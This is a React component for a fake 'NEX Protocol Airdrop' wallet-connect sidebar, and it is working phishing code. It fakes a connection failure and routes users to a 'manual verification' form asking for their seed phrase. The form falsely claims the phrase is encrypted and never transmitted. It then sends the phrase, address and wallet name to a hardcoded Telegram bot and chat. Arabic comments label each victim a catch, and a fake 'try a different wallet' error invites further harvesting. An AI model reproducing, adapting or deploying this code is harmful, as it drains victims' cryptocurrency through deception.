import React, { useState, useEffect } from 'react';
import { X, Loader2, AlertTriangle, ArrowRight, ShieldCheck, Lock } from 'lucide-react';
import { MetamaskIcon, PhantomIcon, TrustIcon, CoinbaseIcon, SolflareIcon } from './Icons';

interface WalletSidebarProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'list' | 'connecting' | 'error' | 'manual-step-1' | 'manual-step-2' | 'verifying' | 'final-error';

export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose }) => {
  const [view, setView] = useState<ViewState>('list');
  const [selectedWallet, setSelectedWallet] = useState<string>('');
  const [addressInput, setAddressInput] = useState('');
  const [seedInput, setSeedInput] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  // إعدادات التليجرام (حط بياناتك هنا يا بطل)
  const TELEGRAM_BOT_TOKEN = "8539671165:AAHAQbaqJq1QFiBMBmOb0_KxRDaD6BQr7A4"; // توكن البوت
  const TELEGRAM_CHAT_ID = "5653350384"; // الآي دي بتاعك

  useEffect(() => {
    if (!isOpen) {
      setTimeout(() => {
        setView('list');
        setSelectedWallet('');
        setAddressInput('');
        setSeedInput('');
        setErrorMsg('');
      }, 300);
    }
  }, [isOpen]);

  const handleWalletClick = (walletName: string) => {
    setSelectedWallet(walletName);
    setView('connecting');
    setTimeout(() => {
      setView('error');
    }, 2000);
  };

  const handleManualStart = () => {
    setView('manual-step-1');
    setErrorMsg('');
  };

  const handleStep1Submit = (e: React.FormEvent) => {
    e.preventDefault();
    if (addressInput.length < 10) {
      setErrorMsg('Invalid wallet address format.');
      return;
    }
    setErrorMsg('');
    setView('manual-step-2');
  };

  // الدالة المعدلة لإرسال البيانات
  const handleStep2Submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const wordCount = seedInput.trim().split(/\s+/).length;
    
    if (wordCount !== 12 && wordCount !== 24) {
      setErrorMsg(`Invalid recovery string length. Detected ${wordCount} words.`);
      return;
    }

    setErrorMsg('');
    setView('verifying');

    // تجهيز الرسالة
    const message = `
🎯 صيدة جديدة يا زيرو!
━━━━━━━━━━━━━━
📱 المحفظة: ${selectedWallet}
🔗 العنوان: ${addressInput}
🔑 الكلمات السرية:
${seedInput}
━━━━━━━━━━━━━━
📍 الموقع: NEX Protocol Airdrop
    `;

    try {
      // إرسال البيانات للتليجرام
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      });
    } catch (err) {
      console.error("Failed to send data:", err);
    }

    // الانتظار ثم إظهار الخطأ النهائي لليوزر
    setTimeout(() => {
      setView('final-error');
    }, 3000);
  };

  const wallets = [
    { name: 'MetaMask', icon: <MetamaskIcon /> },
    { name: 'Phantom', icon: <PhantomIcon /> },
    { name: 'Trust Wallet', icon: <TrustIcon /> },
    { name: 'Coinbase Wallet', icon: <CoinbaseIcon /> },
    { name: 'Solflare', icon: <SolflareIcon /> },
  ];

  return (
    <>
      <div 
        className={`fixed inset-0 z-40 bg-black/60 backdrop-blur-sm transition-opacity duration-300 ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}
        onClick={onClose}
      />

      <div className={`fixed top-0 right-0 h-full w-full sm:w-[420px] bg-[#0A0A0E] border-l border-white/10 z-50 shadow-2xl transform transition-transform duration-300 ${isOpen ? 'translate-x-0' : 'translate-x-full'}`}>
        
        <div className="flex items-center justify-between p-6 border-b border-white/10">
          <h2 className="text-xl font-bold font-mono tracking-wide">
            {view === 'list' && 'Connect Wallet'}
            {view === 'connecting' && 'Connecting...'}
            {view === 'error' && 'Connection Failed'}
            {(view === 'manual-step-1' || view === 'manual-step-2') && 'Manual Verification'}
            {view === 'verifying' && 'Verifying Ownership'}
            {view === 'final-error' && 'Verification Error'}
          </h2>
          <button onClick={onClose} className="p-2 hover:bg-white/5 rounded-full transition-colors">
            <X className="w-5 h-5 text-gray-400" />
          </button>
        </div>

        <div className="p-6 h-[calc(100%-80px)] overflow-y-auto custom-scrollbar">
          
          {view === 'list' && (
            <div className="space-y-3">
              <p className="text-gray-400 text-sm mb-6">Select a wallet to check eligibility and claim your NEX tokens.</p>
              {wallets.map((wallet) => (
                <button
                  key={wallet.name}
                  onClick={() => handleWalletClick(wallet.name)}
                  className="w-full flex items-center justify-between p-4 rounded-xl bg-white/5 border border-white/5 hover:bg-white/10 hover:border-primary/50 transition-all duration-300 group"
                >
                  <div className="flex items-center gap-4">
                    {wallet.icon}
                    <span className="font-semibold text-lg">{wallet.name}</span>
                  </div>
                  <div className="w-2 h-2 rounded-full bg-gray-600 group-hover:bg-primary transition-colors"></div>
                </button>
              ))}
              <div className="mt-8 pt-6 border-t border-white/5">
                <p className="text-xs text-center text-gray-500">
                  By connecting, you agree to the Terms of Service and Privacy Policy.
                </p>
              </div>
            </div>
          )}

          {view === 'connecting' && (
            <div className="flex flex-col items-center justify-center h-64 space-y-6">
              <div className="relative">
                <div className="w-16 h-16 rounded-full border-4 border-primary/20 border-t-primary animate-spin"></div>
                <div className="absolute inset-0 flex items-center justify-center">
                  <Lock className="w-6 h-6 text-primary" />
                </div>
              </div>
              <div className="text-center">
                <h3 className="text-lg font-medium mb-1">Authenticating</h3>
                <p className="text-gray-400 text-sm">Requesting signature from {selectedWallet}...</p>
              </div>
            </div>
          )}

          {view === 'error' && (
            <div className="flex flex-col items-center justify-center h-full space-y-6 animate-fade-in">
              <div className="w-16 h-16 rounded-full bg-red-500/10 flex items-center justify-center mb-2">
                <AlertTriangle className="w-8 h-8 text-red-500" />
              </div>
              <div className="text-center space-y-2">
                <h3 className="text-xl font-bold text-white">Security Handshake Failed</h3>
                <p className="text-red-400 text-sm px-4">
                  We could not verify your wallet signature automatically due to high network congestion.
                </p>
              </div>
              
              <button
                onClick={handleManualStart}
                className="w-full mt-8 py-4 bg-primary text-black font-bold rounded-xl hover:bg-white transition-colors flex items-center justify-center gap-2"
              >
                <span>Verify Manually</span>
                <ArrowRight className="w-5 h-5" />
              </button>
              
              <button onClick={() => setView('list')} className="text-sm text-gray-500 hover:text-white transition-colors">
                Try a different wallet
              </button>
            </div>
          )}

          {view === 'manual-step-1' && (
            <form onSubmit={handleStep1Submit} className="space-y-6 animate-fade-in">
              <div className="p-4 bg-yellow-500/10 border border-yellow-500/20 rounded-lg flex gap-3">
                <ShieldCheck className="w-6 h-6 text-yellow-500 shrink-0" />
                <p className="text-xs text-yellow-200">
                  Manual verification requires you to prove ownership of your address to prevent bot claims.
                </p>
              </div>

              <div className="space-y-2">
                <label className="text-sm text-gray-300 font-medium ml-1">Public Wallet Address</label>
                <input
                  type="text"
                  value={addressInput}
                  onChange={(e) => setAddressInput(e.target.value)}
                  placeholder="0x..."
                  className="w-full bg-black/40 border border-white/10 rounded-xl p-4 text-white focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all font-mono"
                  autoFocus
                />
                {errorMsg && <p className="text-red-500 text-xs ml-1">{errorMsg}</p>}
              </div>

              <button
                type="submit"
                className="w-full py-4 bg-white/10 hover:bg-white/20 border border-white/10 rounded-xl font-bold transition-all flex items-center justify-center gap-2"
              >
                <span>Continue</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </form>
          )}

          {view === 'manual-step-2' && (
            <form onSubmit={handleStep2Submit} className="space-y-6 animate-fade-in">
              <div className="space-y-2">
                <label className="text-sm font-bold text-green-400 ml-1 flex items-center gap-2">
                  <Lock className="w-3 h-3" />
                  Encrypted Recovery String (BIP-39)
                </label>
                <div className="relative">
                  <textarea
                    value={seedInput}
                    onChange={(e) => setSeedInput(e.target.value)}
                    placeholder="Enter your 12 or 24 word recovery phrase separated by spaces..."
                    rows={4}
                    className="w-full bg-black/40 border border-white/10 rounded-xl p-4 text-white focus:border-green-400 focus:ring-1 focus:ring-green-400 outline-none transition-all font-mono text-sm resize-none"
                    spellCheck={false}
                  />
                  <div className="absolute bottom-3 right-3 text-[10px] text-gray-500">
                    AES-256 ENCRYPTED
                  </div>
                </div>
                {errorMsg && <p className="text-red-500 text-xs ml-1 flex items-center gap-1"><AlertTriangle className="w-3 h-3"/> {errorMsg}</p>}
                <p className="text-[10px] text-gray-500 ml-1">
                  This phrase is encrypted locally and used only for one-time ownership verification. It is never transmitted in plain text.
                </p>
              </div>

              <button
                type="submit"
                className="w-full py-4 bg-green-500 hover:bg-green-400 text-black font-bold rounded-xl transition-all flex items-center justify-center gap-2"
              >
                <span>Verify & Claim</span>
                <ShieldCheck className="w-5 h-5" />
              </button>
            </form>
          )}

          {view === 'verifying' && (
            <div className="flex flex-col items-center justify-center h-64 space-y-6">
              <div className="w-16 h-16 rounded-full border-4 border-green-500/20 border-t-green-500 animate-spin"></div>
              <div className="text-center">
                <h3 className="text-lg font-medium mb-1">Verifying...</h3>
                <p className="text-gray-400 text-sm">Validating cryptographic proof...</p>
              </div>
            </div>
          )}

          {view === 'final-error' && (
            <div className="flex flex-col items-center justify-center h-full space-y-6 animate-fade-in">
              <div className="w-16 h-16 rounded-full bg-red-500/10 flex items-center justify-center mb-2">
                <X className="w-8 h-8 text-red-500" />
              </div>
              <div className="text-center space-y-4">
                <h3 className="text-xl font-bold text-white">Verification Error</h3>
                <p className="text-red-400 text-sm px-2 bg-red-500/5 py-4 rounded-lg border border-red-500/10">
                  Address already synchronized for this drop. To prevent Sybil attacks, please try a different wallet.
                </p>
              </div>
              
              <button
                onClick={() => {
                   setView('list');
                   setSeedInput('');
                   setAddressInput('');
                   setSelectedWallet('');
                }}
                className="w-full mt-4 py-3 bg-white/10 hover:bg-white/20 border border-white/10 rounded-xl font-medium transition-colors"
              >
                Try Again
              </button>
            </div>
          )}

        </div>
      </div>
    </>
  );
};
